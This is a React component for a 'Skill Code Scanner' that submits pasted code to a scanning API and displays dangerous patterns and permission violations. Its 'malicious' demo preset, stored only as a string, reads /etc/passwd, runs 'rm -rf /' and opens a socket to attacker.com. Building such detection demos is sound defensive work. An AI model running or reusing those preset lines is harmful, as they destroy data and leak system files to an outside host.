import { useState } from 'react';
import { scanCode } from '../../api/client';

const PRESETS = {
  safe: `// Fibonacci calculator
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

const result = fibonacci(10);
console.log('Result:', result);`,
  malicious: `// Data exfiltration script
const fs = require('fs');
const data = fs.readFileSync('/etc/passwd', 'utf8');
eval('process.exit(1)');
require('child_process').exec('rm -rf /');
const net = require('net');
const sock = net.connect(4444, 'attacker.com');`
};

export default function CodeScanner() {
  const [code, setCode] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);

  const handleScan = async () => {
    if (!code.trim()) return;
    setLoading(true);
    try {
      setResult(await scanCode(code));
    } catch (e) {
      setResult({ error: e.message });
    }
    setLoading(false);
  };

  return (
    <div className="bg-gray-900 border border-gray-800 rounded-xl p-6">
      <h3 className="text-lg font-semibold text-white mb-1">Skill Code Scanner</h3>
      <p className="text-gray-500 text-xs mb-4">Paste code to scan for security patterns and verify permissions.</p>

      <div className="flex gap-2 mb-3">
        <button onClick={() => setCode(PRESETS.safe)}
          className="px-2 py-1 text-xs rounded bg-gray-800 text-emerald-400 border border-gray-700 hover:bg-gray-700 cursor-pointer">
          Load Safe Code
        </button>
        <button onClick={() => setCode(PRESETS.malicious)}
          className="px-2 py-1 text-xs rounded bg-gray-800 text-red-400 border border-gray-700 hover:bg-gray-700 cursor-pointer">
          Load Malicious Code
        </button>
      </div>

      <textarea value={code} onChange={(e) => setCode(e.target.value)}
        className="w-full bg-gray-800 border border-gray-700 rounded-lg p-3 text-xs text-green-300 font-mono resize-none h-36 focus:outline-none focus:border-emerald-500"
        placeholder="Paste skill code here..." />

      <button onClick={handleScan} disabled={loading || !code.trim()}
        className="mt-2 w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-700 disabled:cursor-not-allowed text-white py-2 rounded-lg text-sm font-medium cursor-pointer">
        {loading ? 'Scanning...' : 'Scan Code'}
      </button>

      {result?.error && (
        <div className="mt-4 p-3 rounded-lg bg-red-950 border border-red-800 text-red-300 text-sm">{result.error}</div>
      )}

      {result && !result.error && (
        <div className="mt-4 space-y-3">
          <div className={`p-3 rounded-lg border ${result.permissions?.allowed ? 'bg-emerald-950/50 border-emerald-800' : 'bg-red-950/50 border-red-800'}`}>
            <div className="flex justify-between items-center">
              <span className={`font-bold text-sm ${result.permissions?.allowed ? 'text-emerald-400' : 'text-red-400'}`}>
                {result.permissions?.allowed ? 'CODE APPROVED' : 'VIOLATIONS FOUND'}
              </span>
              <span className="text-xs text-gray-500 font-mono">
                SHA-256: {result.hash?.slice(0, 12)}...
              </span>
            </div>
          </div>

          {result.patterns?.length > 0 && (
            <div>
              <h4 className="text-xs text-gray-500 uppercase tracking-wide mb-1">Dangerous Patterns ({result.patterns.length})</h4>
              <div className="space-y-1">
                {result.patterns.map((p, i) => (
                  <div key={i} className="text-xs font-mono bg-red-950/30 border border-red-800/50 p-2 rounded flex items-start gap-2">
                    <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold uppercase shrink-0 ${p.severity === 'high' ? 'bg-red-900 text-red-300' : 'bg-amber-900 text-amber-300'}`}>{p.severity}</span>
                    <span className="text-gray-300">{p.description}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {result.permissions?.violations?.length > 0 && (
            <div>
              <h4 className="text-xs text-gray-500 uppercase tracking-wide mb-1">Permission Violations</h4>
              <div className="space-y-1">
                {result.permissions.violations.map((v, i) => (
                  <div key={i} className="text-xs bg-amber-950/30 border border-amber-800/50 p-2 rounded">
                    <span className="text-amber-400 font-medium">{v.type}:</span>{' '}
                    <span className="text-gray-300">{v.message}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {result.patterns?.length === 0 && result.permissions?.violations?.length === 0 && (
            <div className="text-xs text-emerald-400">No security issues detected. Code passes all checks.</div>
          )}

          {result.chain?.digest && (
            <div className="p-2 rounded-lg bg-emerald-950/30 border border-emerald-800/50 flex items-center justify-between">
              <span className="text-[11px] text-emerald-400">Violation logged on-chain</span>
              <a href={`https://suiscan.xyz/devnet/tx/${result.chain.digest}`} target="_blank" rel="noopener noreferrer"
                className="text-[11px] font-mono text-emerald-300 hover:underline">
                {result.chain.digest.slice(0, 20)}...
              </a>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
